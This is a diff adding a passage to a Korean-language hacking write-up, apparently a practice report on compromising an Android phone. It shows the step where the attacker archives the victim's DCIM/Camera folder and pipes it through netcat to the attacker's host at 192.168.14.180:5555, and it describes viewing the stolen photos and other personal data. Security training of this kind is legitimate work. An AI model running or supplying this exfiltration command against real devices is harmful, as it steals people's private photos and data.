@@ -325,9 +325,18 @@ echo "
 |---------|
 | cd /storage/emulated/O/DCIM |
 
+> <img width="456" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/723d2566-2245-4d07-ac0a-9c09898bef54">
 
+- 공격자의 또 다른 포트를 열어두고 사용자의 휴대폰에서 공격자의 서버로 데이터를 전송한다.
 
+| 입력 구문 |
+|---------|
+| tar cfp – Camera | nc 192.168.14.180 5555 |
 
+> <img width="477" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/a481990b-5e31-4544-a7af-9a843e2ea9aa">
 
+- 사용자의 휴대폰 카메라에 접근했을 때 이미지 파일들을 전부 확인할 수 있다. 이 외에도 사용자의 개인정보나 중요 정보를 획득할 수 있다.
+
+> <img width="478" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/64c8d468-caa6-449f-b4e6-599f698036f2">
 
 
